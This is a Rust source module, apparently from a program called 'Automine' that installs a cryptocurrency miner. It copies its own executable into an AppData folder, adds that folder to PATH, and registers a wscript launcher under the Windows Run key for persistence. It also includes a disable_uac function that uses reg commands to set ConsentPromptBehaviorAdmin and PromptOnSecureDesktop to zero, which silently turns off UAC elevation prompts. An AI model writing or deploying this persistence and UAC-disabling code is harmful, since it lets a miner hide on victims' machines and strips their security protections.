use std::fs;
use std::io::Write;
use std::path::Path;

use crate::utils::paths::{get_appdata_dir, get_userprofile};

#[cfg(windows)]
use winreg::enums::*;
#[cfg(windows)]
use winreg::RegKey;

fn get_bin_dir() -> std::path::PathBuf {
    get_appdata_dir().join("bin")
}

#[cfg(windows)]
pub fn add_to_path() -> Result<(), Box<dyn std::error::Error>> {
    let bin_dir = get_bin_dir();
    let bin_dir_str = bin_dir.to_string_lossy().to_string();

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let env_key = hkcu.open_subkey_with_flags("Environment", KEY_READ | KEY_WRITE)?;
    
    let current_path: String = env_key.get_value("Path").unwrap_or_default();
    
    if !current_path.to_lowercase().contains(&bin_dir_str.to_lowercase()) {
        let new_path = if current_path.is_empty() {
            bin_dir_str
        } else {
            format!("{};{}", current_path, bin_dir_str)
        };
        env_key.set_value("Path", &new_path)?;
        
        unsafe {
            use winapi::um::winuser::{SendMessageTimeoutW, HWND_BROADCAST, SMTO_ABORTIFHUNG, WM_SETTINGCHANGE};
            let mut result: usize = 0;
            SendMessageTimeoutW(
                HWND_BROADCAST,
                WM_SETTINGCHANGE,
                0,
                "Environment\0".encode_utf16().collect::<Vec<u16>>().as_ptr() as isize,
                SMTO_ABORTIFHUNG,
                5000,
                &mut result as *mut usize,
            );
        }
    }
    Ok(())
}

#[cfg(not(windows))]
pub fn add_to_path() -> Result<(), Box<dyn std::error::Error>> {
    let bin_dir = get_bin_dir();
    let shell_rc = get_userprofile().join(".bashrc");
    
    let content = fs::read_to_string(&shell_rc).unwrap_or_default();
    let export_line = format!("export PATH=\"{}:$PATH\"", bin_dir.display());
    
    if !content.contains(&export_line) {
        let mut file = fs::OpenOptions::new()
            .append(true)
            .create(true)
            .open(&shell_rc)?;
        writeln!(file, "\n# Automine")?;
        writeln!(file, "{}", export_line)?;
    }
    Ok(())
}

#[cfg(windows)]
pub fn remove_from_path() -> Result<(), Box<dyn std::error::Error>> {
    let bin_dir = get_bin_dir();
    let bin_dir_str = bin_dir.to_string_lossy().to_string();

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    if let Ok(env_key) = hkcu.open_subkey_with_flags("Environment", KEY_READ | KEY_WRITE) {
        let current_path: String = env_key.get_value("Path").unwrap_or_default();
        
        let new_path: String = current_path
            .split(';')
            .filter(|p| !p.to_lowercase().eq(&bin_dir_str.to_lowercase()))
            .collect::<Vec<_>>()
            .join(";");
        
        let _ = env_key.set_value("Path", &new_path);
    }
    Ok(())
}

#[cfg(not(windows))]
pub fn remove_from_path() -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}

#[cfg(windows)]
pub fn add_to_startup(vbs_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let (key, _) = hkcu.create_subkey(r"Software\Microsoft\Windows\CurrentVersion\Run")?;
    let value = format!(r#"wscript.exe "{}""#, vbs_path.display());
    key.set_value("Automine", &value)?;
    Ok(())
}

#[cfg(not(windows))]
pub fn add_to_startup(_vbs_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}

#[cfg(windows)]
pub fn remove_from_startup() -> Result<(), Box<dyn std::error::Error>> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    if let Ok(key) = hkcu.open_subkey_with_flags(r"Software\Microsoft\Windows\CurrentVersion\Run", KEY_SET_VALUE) {
        let _ = key.delete_value("Automine");
    }
    Ok(())
}

#[cfg(not(windows))]
pub fn remove_from_startup() -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}

pub fn copy_self_to_bin() -> Result<(), Box<dyn std::error::Error>> {
    let bin_dir = get_bin_dir();
    fs::create_dir_all(&bin_dir)?;
    
    let current_exe = std::env::current_exe()?;
    let target_exe = if cfg!(windows) {
        bin_dir.join("automine.exe")
    } else {
        bin_dir.join("automine")
    };
    
    if current_exe != target_exe {
        let _ = fs::copy(&current_exe, &target_exe);
    }
    
    Ok(())
}

pub fn is_installed() -> bool {
    let automine_dir = get_appdata_dir();
    let miner_exe = automine_dir.join(crate::common::constants::MINER_EXE_NAME);
    miner_exe.exists()
}

#[cfg(windows)]
pub fn disable_uac() -> Result<(), Box<dyn std::error::Error>> {
    // Attempt to set ConsentPromptBehaviorAdmin to 0 (Elevate without prompting)
    // and PromptOnSecureDesktop to 0 (No dimming)
    // This requires Admin privileges.
    
    use std::process::Command;
    
    // ConsentPromptBehaviorAdmin = 0
    let _ = Command::new("reg")
        .args(&[
            "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
            "/v", "ConsentPromptBehaviorAdmin",
            "/t", "REG_DWORD",
            "/d", "0",
            "/f"
        ])
        .output();

    // PromptOnSecureDesktop = 0
    let _ = Command::new("reg")
        .args(&[
            "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
            "/v", "PromptOnSecureDesktop",
            "/t", "REG_DWORD",
            "/d", "0",
            "/f"
        ])
        .output();

    Ok(())
}

#[cfg(not(windows))]
pub fn disable_uac() -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}
